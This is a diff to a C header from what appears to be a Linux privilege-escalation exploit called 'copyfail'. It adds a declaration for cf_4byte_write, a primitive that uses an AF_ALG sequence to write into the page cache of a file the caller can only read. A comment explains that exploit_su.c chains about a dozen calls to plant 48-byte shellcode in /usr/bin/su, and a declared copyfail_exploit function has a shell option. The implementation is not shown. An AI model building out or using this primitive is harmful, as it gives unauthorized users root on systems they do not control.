@@ -20,4 +20,14 @@ df_result_t copyfail_detect(void);
  * does not stay in a broken state. */
 df_result_t copyfail_exploit(bool do_shell);
 
+/* Low-level building block: write 4 bytes into the page cache of
+ * `target_path` at `target_off`. Caller must have read access to
+ * the file. Same primitive that copyfail_exploit uses internally;
+ * exposed for exploit_su.c to chain ~12 calls into a 48-byte
+ * shellcode plant against /usr/bin/su. Returns true if the AF_ALG
+ * sequence completed; caller MUST verify via re-read. */
+bool cf_4byte_write(const char *target_path,
+                    off_t target_off,
+                    const unsigned char four_bytes[4]);
+
 #endif
